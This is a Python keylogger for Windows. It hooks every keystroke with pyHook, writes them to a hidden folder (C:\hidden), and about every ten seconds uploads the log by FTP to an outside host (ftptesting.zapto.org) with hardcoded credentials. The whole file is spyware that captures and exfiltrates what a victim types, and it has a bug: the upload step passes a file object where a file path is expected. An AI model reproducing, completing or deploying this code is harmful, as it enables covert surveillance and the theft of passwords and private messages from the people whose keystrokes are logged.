import pyHook, pythoncom, sys, logging
import os
import time
import ftplib

newpath = r'C:\hidden' 
if not os.path.exists(newpath):
    os.makedirs(newpath)

t = time.time()

t_end = time.time() + 10
	
file_log = 'C:\\hidden\hidden.txt'

def CheckTime(endtime):
	
	

		
	global t
	
	if time.time() - t > 10:
	
		data = open('C:\\hidden\\hidden.txt').read()
		newdoc = open('C:\\hidden\\formatted' + str(time.time()) + ".txt", "w")
		newdoc.write(data.replace('\n', "").replace('\r', ""))
		newdoc.close()
		t = time.time()
		
		session = ftplib.FTP('ftptesting.zapto.org','FtpUser','505BOGbs8')
		file = open(newdoc,'rb')                  # file to send
		session.storbinary('STOR newdoc', file)     # send the file
		file.close()                                    # close file and FTP
		session.quit()
			
		return  
	
	else:
		
		return 

def OnKeyboardEvent(event):
	
	CheckTime(t_end)
	logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
	chr(event.Ascii)
	logging.log(10,chr(event.Ascii))
	return True	

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()




exit() 
	